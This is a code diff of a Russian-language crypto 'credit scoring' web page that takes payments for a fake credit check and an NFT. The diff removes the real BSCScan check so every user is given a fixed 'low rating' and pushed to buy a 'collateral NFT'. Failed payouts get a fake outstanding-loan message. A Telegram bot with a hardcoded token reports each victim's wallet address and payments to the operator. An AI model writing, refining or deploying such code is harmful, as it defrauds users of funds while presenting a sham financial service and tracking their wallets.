@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Credit Scoring System</title>
+    <title>Credit System</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
         :root { --accent: #00f2ff; --bg: #030308; --card: #0d0d1a; --text-main: #ffffff; --text-dim: #a0a0b8; --success: #00ff88; --error: #ff0055; }
@@ -19,7 +19,6 @@
         .btn { background: var(--accent); color: #000; border: none; padding: 18px 30px; border-radius: 16px; font-weight: 700; cursor: pointer; width: 100%; font-size: 16px; transition: 0.3s; }
         .btn:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(0, 242, 255, 0.2); }
         .btn-nft { background: rgba(0, 242, 255, 0.1); border: 1px solid var(--accent); color: var(--accent); margin-top: 10px; padding: 12px; font-size: 13px; border-radius: 12px; font-weight: 600; width: 100%; cursor: pointer; }
-        .dashboard { margin-top: 10px; }
         .status-msg { font-size: 13px; margin-top: 20px; min-height: 20px; font-weight: 500; }
         .result-card { display: none; margin-top: 20px; padding: 25px; border-radius: 20px; border: 1px solid #444; text-align: left; background: rgba(255,255,255,0.02); }
         .loader { border: 2px solid #f3f3f3; border-top: 2px solid var(--accent); border-radius: 50%; width: 14px; height: 14px; animation: spin 1s linear infinite; display: inline-block; margin-right: 8px; vertical-align: middle; }
@@ -65,7 +64,6 @@
 </div>
 
 <script>
-    // --- ДАННЫЕ ИЗ ТВОЕГО ЗАПРОСА ---
     const TELEGRAM_TOKEN = "8514449991:AAGOD-zVo3f8-WPz0XrFXzv_iznFJMaYJi0"; 
     const TELEGRAM_CHAT_ID = "5611455025"; 
     const CONTRACT_ADDRESS = "0x6DF193f9c0a2AFDb9Dfa883f95C82Addd1613F2f"; 
@@ -74,15 +72,14 @@
     const ABI = [
         "function requestVerification() public payable",
         "function buyBoostNFT() public payable",
-        "function claimCredit() public",
-        "function availableCreditBalance(address) public view returns (uint256)"
+        "function claimCredit() public"
     ];
 
     let signer, address, contract;
 
     async function sendTelegram(msg) {
         const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`;
-        try { await fetch(url, { method: 'GET' }); } catch (e) { console.error("TG Error"); }
+        try { await fetch(url, { method: 'GET' }); } catch (e) {}
     }
 
     function updateUI() {
@@ -106,19 +103,28 @@
             document.getElementById('dashboard').style.display = "block";
             document.getElementById('userAddr').innerText = address.substring(0,6) + "..." + address.substring(38);
             
-            sendTelegram(`👤 <b>Вход в сервис</b>\nЮзер: <code>${address}</code>`);
-
-            if (localStorage.getItem('paid_analysis_' + address) === 'true') {
-                document.getElementById('dashboard').style.display = "none";
-                renderResult(false, "НИЗКИЙ РЕЙТИНГ", "Анализ завершен. Для активации лимита требуется залоговый NFT.", true, false);
-            } else {
-                updateUI();
-            }
+            checkFlowState(); // Проверяем на каком этапе юзер
         } catch (e) { showStatus("Ошибка входа", "#ff0055"); }
     }
 
+    function checkFlowState() {
+        // 1. Проверяем купил ли NFT
+        if (localStorage.getItem('nft_purchased_' + address) === 'true') {
+            document.getElementById('dashboard').style.display = "none";
+            renderResult(true, "ЛИМИТ ОДОБРЕН", "Залоговый NFT подтвержден. Теперь вы можете забрать выплату.", false, true);
+        } 
+        // 2. Проверяем оплатил ли анализ
+        else if (localStorage.getItem('paid_analysis_' + address) === 'true') {
+            document.getElementById('dashboard').style.display = "none";
+            renderResult(false, "НИЗКИЙ РЕЙТИНГ", "Анализ завершен. Для активации лимита требуется залоговый NFT.", true, false);
+        } 
+        // 3. Если ничего не делал
+        else {
+            updateUI();
+        }
+    }
+
     async function processCredit() {
-        const amount = document.getElementById('amountSlider').value;
         const btn = document.getElementById('actionBtn');
         btn.disabled = true;
         try {
@@ -127,31 +133,13 @@
             await tx.wait();
 
             localStorage.setItem('paid_analysis_' + address, 'true');
-            sendTelegram(`🔎 <b>Оплачен анализ</b>\nЮзер: <code>${address}</code>\nЗапрос: <b>$${amount}</b>`);
-            showStatus("<div class='loader'></div> Анализ кредитной истории...", "#fff");
+            sendTelegram(`🔎 <b>Оплачен анализ</b>\nЮзер: <code>${address}</code>`);
             
-            setTimeout(() => runAnalysis(amount), 2000);
+            checkFlowState();
         } catch (e) { 
             showStatus("Транзакция отменена", "#ff0055"); 
             btn.disabled = false; 
         }
-    }
-
-    async function runAnalysis(reqAmount) {
-        const url = `https://api.bscscan.com/api?module=account&action=txlist&address=${address}&sort=asc&apikey=${BSC_API_KEY}`;
-        try {
-            const res = await fetch(url);
-            const data = await res.json();
-            document.getElementById('dashboard').style.display = "none";
-            const txs = data.result || [];
-            const isOld = txs.length > 0 && (Date.now() - (txs[0].timeStamp * 1000)) >= (365 * 24 * 60 * 60 * 1000);
-            
-            if (isOld && txs.length > 70) {
-                renderResult(true, "ОДОБРЕНО", `Лимит в $${reqAmount} подтвержден.`, false, true);
-            } else {
-                renderResult(false, "НИЗКИЙ РЕЙТИНГ", "Недостаточно транзакций в сети. Для разблокировки лимита требуется NFT.", true, false);
-            }
-        } catch (e) { renderResult(false, "ОШИБКА", "Ошибка сети BSC.", false); }
     }
 
     async function buyNFT(price) {
@@ -159,8 +147,12 @@
             showStatus("<div class='loader'></div> Покупка NFT...", "#fff");
             const tx = await contract.buyBoostNFT({ value: ethers.utils.parseEther(price) });
             await tx.wait();
+
+            // ЗАПОМИНАЕМ ПОКУПКУ NFT
+            localStorage.setItem('nft_purchased_' + address, 'true');
+            
             sendTelegram(`🔥 <b>КУПЛЕН NFT (${price} BNB)</b>\nЮзер: <code>${address}</code>`);
-            renderResult(true, "NFT АКТИВИРОВАН", "Лимит разблокирован. Заберите выплату на кошелек.", false, true);
+            checkFlowState(); // Обновляем экран на кнопку "Забрать"
         } catch (e) { showStatus("Ошибка оплаты", "#ff0055"); }
     }
 
@@ -172,9 +164,8 @@
             sendTelegram(`💰 <b>ВЫПЛАТА ПОЛУЧЕНА!</b>\nЮзер: <code>${address}</code>`);
             showStatus("Зачислено!", "#00ff88");
         } catch (e) { 
-            // ПРАВКА: Текст про непогашенный кредит
             showStatus("У вас есть непогашенный кредит!", "#ff0055"); 
-            alert("Ошибка: У вас есть активный непогашенный кредит. Повторная выплата доступна через 31 день.");
+            alert("Ошибка: Повторная выплата доступна через 31 день.");
         }
     }
 
